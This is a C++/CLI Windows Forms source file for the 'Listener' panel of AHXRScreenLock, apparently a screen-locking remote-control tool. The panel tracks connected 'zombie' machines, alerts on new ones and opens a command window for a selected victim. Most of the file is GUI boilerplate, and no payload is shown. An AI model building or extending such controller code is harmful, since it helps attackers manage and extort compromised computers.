/*
	@title
		AHXRScreenLock
	@author
		AHXR (https://github.com/AHXR)
	@copyright
		2017

	AHXRScreenLock is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	AHXRScreenLock is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with AHXRScreenLock.  If not, see <http://www.gnu.org/licenses/>.
*/
//=======================================================
#pragma once
namespace AHXRListener {

	using namespace System;
	using namespace System::ComponentModel;
	using namespace System::Collections;
	using namespace System::Windows::Forms;
	using namespace System::Data;
	using namespace System::Drawing;

	/// <summary>
	/// Summary for frmMain
	/// </summary>
	public ref class frmMain : public System::Windows::Forms::Form
	{
	public:
		frmMain(void)
		{
			InitializeComponent();
			//
			//TODO: Add the constructor code here
			//
		}

	protected:
		/// <summary>
		/// Clean up any resources being used.
		/// </summary>
		~frmMain()
		{
			if (components)
			{
				delete components;
			}
		}
	private: System::Windows::Forms::Panel^  panel1;
	protected:
	private: System::Windows::Forms::Label^  btnUpdate;
	private: System::Windows::Forms::Label^  btnAbout;
	private: System::Windows::Forms::Label^  btnExit;
	private: System::Windows::Forms::Label^  label1;
	private: bool b_dragging;
	private: Point p_offset;
	public: System::Windows::Forms::ListBox^  lstListener;
	private:

	private:

	private: System::Windows::Forms::Timer^  tmrUpdate;
	private: System::Windows::Forms::NotifyIcon^  notifyIcon1;
	private: System::Windows::Forms::Label^  btnMinimize;
	private: System::ComponentModel::IContainer^  components;
	public:

	private:
		/// <summary>
		/// Required designer variable.
		/// </summary>


#pragma region Windows Form Designer generated code
		/// <summary>
		/// Required method for Designer support - do not modify
		/// the contents of this method with the code editor.
		/// </summary>
		void InitializeComponent(void)
		{
			this->components = (gcnew System::ComponentModel::Container());
			System::ComponentModel::ComponentResourceManager^  resources = (gcnew System::ComponentModel::ComponentResourceManager(frmMain::typeid));
			this->panel1 = (gcnew System::Windows::Forms::Panel());
			this->btnMinimize = (gcnew System::Windows::Forms::Label());
			this->btnUpdate = (gcnew System::Windows::Forms::Label());
			this->btnAbout = (gcnew System::Windows::Forms::Label());
			this->btnExit = (gcnew System::Windows::Forms::Label());
			this->label1 = (gcnew System::Windows::Forms::Label());
			this->lstListener = (gcnew System::Windows::Forms::ListBox());
			this->tmrUpdate = (gcnew System::Windows::Forms::Timer(this->components));
			this->notifyIcon1 = (gcnew System::Windows::Forms::NotifyIcon(this->components));
			this->panel1->SuspendLayout();
			this->SuspendLayout();
			// 
			// panel1
			// 
			this->panel1->BackColor = System::Drawing::Color::FromArgb(static_cast<System::Int32>(static_cast<System::Byte>(20)), static_cast<System::Int32>(static_cast<System::Byte>(20)),
				static_cast<System::Int32>(static_cast<System::Byte>(20)));
			this->panel1->Controls->Add(this->btnMinimize);
			this->panel1->Controls->Add(this->btnUpdate);
			this->panel1->Controls->Add(this->btnAbout);
			this->panel1->Controls->Add(this->btnExit);
			this->panel1->Controls->Add(this->label1);
			this->panel1->Location = System::Drawing::Point(-8, -30);
			this->panel1->Name = L"panel1";
			this->panel1->Size = System::Drawing::Size(796, 62);
			this->panel1->TabIndex = 6;
			this->panel1->MouseDown += gcnew System::Windows::Forms::MouseEventHandler(this, &frmMain::panel1_MouseDown);
			this->panel1->MouseMove += gcnew System::Windows::Forms::MouseEventHandler(this, &frmMain::panel1_MouseMove);
			this->panel1->MouseUp += gcnew System::Windows::Forms::MouseEventHandler(this, &frmMain::panel1_MouseUp);
			// 
			// btnMinimize
			// 
			this->btnMinimize->AutoSize = true;
			this->btnMinimize->Font = (gcnew System::Drawing::Font(L"Trebuchet MS", 15.75F, System::Drawing::FontStyle::Regular, System::Drawing::GraphicsUnit::Point,
				static_cast<System::Byte>(0)));
			this->btnMinimize->ForeColor = System::Drawing::Color::DodgerBlue;
			this->btnMinimize->Location = System::Drawing::Point(741, 32);
			this->btnMinimize->Name = L"btnMinimize";
			this->btnMinimize->Size = System::Drawing::Size(20, 27);
			this->btnMinimize->TabIndex = 5;
			this->btnMinimize->Text = L"-";
			this->btnMinimize->Click += gcnew System::EventHandler(this, &frmMain::btnMinimize_Click);
			this->btnMinimize->MouseEnter += gcnew System::EventHandler(this, &frmMain::btnMinimize_MouseEnter);
			this->btnMinimize->MouseLeave += gcnew System::EventHandler(this, &frmMain::btnMinimize_MouseLeave);
			// 
			// btnUpdate
			// 
			this->btnUpdate->AutoSize = true;
			this->btnUpdate->Font = (gcnew System::Drawing::Font(L"Trebuchet MS", 12, System::Drawing::FontStyle::Regular, System::Drawing::GraphicsUnit::Point,
				static_cast<System::Byte>(0)));
			this->btnUpdate->ForeColor = System::Drawing::Color::DodgerBlue;
			this->btnUpdate->Location = System::Drawing::Point(654, 35);
			this->btnUpdate->Name = L"btnUpdate";
			this->btnUpdate->Size = System::Drawing::Size(32, 22);
			this->btnUpdate->TabIndex = 3;
			this->btnUpdate->Text = L"1.3";
			// 
			// btnAbout
			// 
			this->btnAbout->AutoSize = true;
			this->btnAbout->Font = (gcnew System::Drawing::Font(L"Trebuchet MS", 12, System::Drawing::FontStyle::Regular, System::Drawing::GraphicsUnit::Point,
				static_cast<System::Byte>(0)));
			this->btnAbout->ForeColor = System::Drawing::Color::DodgerBlue;
			this->btnAbout->Location = System::Drawing::Point(721, 35);
			this->btnAbout->Name = L"btnAbout";
			this->btnAbout->Size = System::Drawing::Size(19, 22);
			this->btnAbout->TabIndex = 2;
			this->btnAbout->Text = L"A";
			this->btnAbout->Click += gcnew System::EventHandler(this, &frmMain::btnAbout_Click);
			this->btnAbout->MouseEnter += gcnew System::EventHandler(this, &frmMain::btnAbout_MouseEnter);
			this->btnAbout->MouseLeave += gcnew System::EventHandler(this, &frmMain::btnAbout_MouseLeave);
			// 
			// btnExit
			// 
			this->btnExit->AutoSize = true;
			this->btnExit->Font = (gcnew System::Drawing::Font(L"Trebuchet MS", 12, System::Drawing::FontStyle::Regular, System::Drawing::GraphicsUnit::Point,
				static_cast<System::Byte>(0)));
			this->btnExit->ForeColor = System::Drawing::Color::DodgerBlue;
			this->btnExit->Location = System::Drawing::Point(762, 35);
			this->btnExit->Name = L"btnExit";
			this->btnExit->Size = System::Drawing::Size(19, 22);
			this->btnExit->TabIndex = 1;
			this->btnExit->Text = L"X";
			this->btnExit->Click += gcnew System::EventHandler(this, &frmMain::btnExit_Click);
			this->btnExit->MouseEnter += gcnew System::EventHandler(this, &frmMain::btnExit_MouseEnter);
			this->btnExit->MouseLeave += gcnew System::EventHandler(this, &frmMain::btnExit_MouseLeave);
			this->btnExit->MouseHover += gcnew System::EventHandler(this, &frmMain::btnExit_MouseHover);
			// 
			// label1
			// 
			this->label1->AutoSize = true;
			this->label1->Font = (gcnew System::Drawing::Font(L"Trebuchet MS", 12, System::Drawing::FontStyle::Regular, System::Drawing::GraphicsUnit::Point,
				static_cast<System::Byte>(0)));
			this->label1->ForeColor = System::Drawing::Color::DodgerBlue;
			this->label1->Location = System::Drawing::Point(16, 35);
			this->label1->Name = L"label1";
			this->label1->Size = System::Drawing::Size(201, 22);
			this->label1->TabIndex = 0;
			this->label1->Text = L"AHXRScreenLock - Listener";
			// 
			// lstListener
			// 
			this->lstListener->Font = (gcnew System::Drawing::Font(L"Trebuchet MS", 9.75F, System::Drawing::FontStyle::Regular, System::Drawing::GraphicsUnit::Point,
				static_cast<System::Byte>(0)));
			this->lstListener->ForeColor = System::Drawing::Color::DodgerBlue;
			this->lstListener->FormattingEnabled = true;
			this->lstListener->ItemHeight = 18;
			this->lstListener->Location = System::Drawing::Point(12, 38);
			this->lstListener->Name = L"lstListener";
			this->lstListener->Size = System::Drawing::Size(761, 328);
			this->lstListener->TabIndex = 7;
			this->lstListener->SelectedIndexChanged += gcnew System::EventHandler(this, &frmMain::lstListener_SelectedIndexChanged);
			// 
			// tmrUpdate
			// 
			this->tmrUpdate->Enabled = true;
			this->tmrUpdate->Interval = 1000;
			this->tmrUpdate->Tick += gcnew System::EventHandler(this, &frmMain::tmrUpdate_Tick);
			// 
			// notifyIcon1
			// 
			this->notifyIcon1->BalloonTipIcon = System::Windows::Forms::ToolTipIcon::Info;
			this->notifyIcon1->BalloonTipTitle = L"AHXRScreenLock - Listener";
			this->notifyIcon1->Icon = (cli::safe_cast<System::Drawing::Icon^>(resources->GetObject(L"notifyIcon1.Icon")));
			this->notifyIcon1->Text = L"AHXRScreenLock - Listener";
			this->notifyIcon1->Visible = true;
			this->notifyIcon1->MouseDoubleClick += gcnew System::Windows::Forms::MouseEventHandler(this, &frmMain::notifyIcon1_MouseDoubleClick);
			// 
			// frmMain
			// 
			this->AutoScaleDimensions = System::Drawing::SizeF(6, 13);
			this->AutoScaleMode = System::Windows::Forms::AutoScaleMode::Font;
			this->BackColor = System::Drawing::Color::FromArgb(static_cast<System::Int32>(static_cast<System::Byte>(35)), static_cast<System::Int32>(static_cast<System::Byte>(35)),
				static_cast<System::Int32>(static_cast<System::Byte>(35)));
			this->ClientSize = System::Drawing::Size(785, 373);
			this->Controls->Add(this->lstListener);
			this->Controls->Add(this->panel1);
			this->FormBorderStyle = System::Windows::Forms::FormBorderStyle::None;
			this->Name = L"frmMain";
			this->Text = L"frmMain";
			this->panel1->ResumeLayout(false);
			this->panel1->PerformLayout();
			this->ResumeLayout(false);

		}
#pragma endregion
	private: System::Void btnExit_Click(System::Object^  sender, System::EventArgs^  e) {
		Application::Exit();
	}
private: System::Void btnAbout_Click(System::Object^  sender, System::EventArgs^  e) {
	System::Diagnostics::Process::Start("https://github.com/AHXR/AHXR-ScreenLock");
}
		 private: System::Void panel1_MouseDown(System::Object^  sender, System::Windows::Forms::MouseEventArgs^  e) {
			 this->b_dragging = true;
			 this->p_offset = Point(e->X, e->Y);
		 }
private: System::Void panel1_MouseMove(System::Object^  sender, System::Windows::Forms::MouseEventArgs^  e) {
	if (this->b_dragging) {
		Point p_current = PointToScreen(e->Location);
		Location = Point(p_current.X - this->p_offset.X, p_current.Y - this->p_offset.Y);
	}
}
private: System::Void panel1_MouseUp(System::Object^  sender, System::Windows::Forms::MouseEventArgs^  e) {
	this->b_dragging = false;
}
private: System::Void btnExit_MouseHover(System::Object^  sender, System::EventArgs^  e) {
	this->btnExit->ForeColor = System::Drawing::Color::White;
}
private: System::Void btnExit_MouseLeave(System::Object^  sender, System::EventArgs^  e) {
	this->btnExit->ForeColor = System::Drawing::Color::DodgerBlue;
}
private: System::Void btnExit_MouseEnter(System::Object^  sender, System::EventArgs^  e) {
	this->btnExit->ForeColor = System::Drawing::Color::White;
}
private: System::Void btnAbout_MouseLeave(System::Object^  sender, System::EventArgs^  e) {
	this->btnAbout->ForeColor = System::Drawing::Color::DodgerBlue;
}
private: System::Void btnAbout_MouseEnter(System::Object^  sender, System::EventArgs^  e) {
	this->btnAbout->ForeColor = System::Drawing::Color::White;
}
private: System::Void tmrUpdate_Tick(System::Object^  sender, System::EventArgs^  e) {

	System::String ^ s_message;

	if (i_zombie_update != getZombieCount()) {

		this->lstListener->Items->Clear();

		if (i_zombie_update < getZombieCount())
			s_message = MSG_NEW_ZOMBIE;
		else if (i_zombie_update > getZombieCount())
			s_message = MSG_ZOMBIE_DIS;

		int i_zombieID;
		int i_lists_added = 0;

		for (int i = i_zombie_update; i != getZombieCount(); i++) {

			i_zombieID = getZombieIDFromMessage(getZombieMessage(i));
			setZombieListID(i_zombieID, i_lists_added);

			this->lstListener->Items->Add(gcnew String(getZombieMessage(i).c_str()));
			this->notifyIcon1->ShowBalloonTip(5000, "AHXRScreenLock - Listener", MSG_NEW_ZOMBIE, ToolTipIcon::Info);
			i_lists_added++;
		}
		i_zombie_update = getZombieCount();
	}
}
private: System::Void btnMinimize_Click(System::Object^  sender, System::EventArgs^  e) {
	this->Hide();
	this->notifyIcon1->ShowBalloonTip(5000, "AHXRScreenLock - Listener", MSG_BACKGROUND, ToolTipIcon::Info);
}
private: System::Void notifyIcon1_MouseDoubleClick(System::Object^  sender, System::Windows::Forms::MouseEventArgs^  e) {
	this->Show();
}
private: System::Void btnMinimize_MouseEnter(System::Object^  sender, System::EventArgs^  e) {
	this->btnMinimize->ForeColor = System::Drawing::Color::White;
}
private: System::Void btnMinimize_MouseLeave(System::Object^  sender, System::EventArgs^  e) {
	this->btnMinimize->ForeColor = System::Drawing::Color::DodgerBlue;
}
private: System::Void lstListener_SelectedIndexChanged(System::Object^  sender, System::EventArgs^  e) {
	if (!b_unlock_dialog) {
		i_selected_idx = this->lstListener->SelectedIndex;
		SHOWCMDGUI();
	}
}
};
}
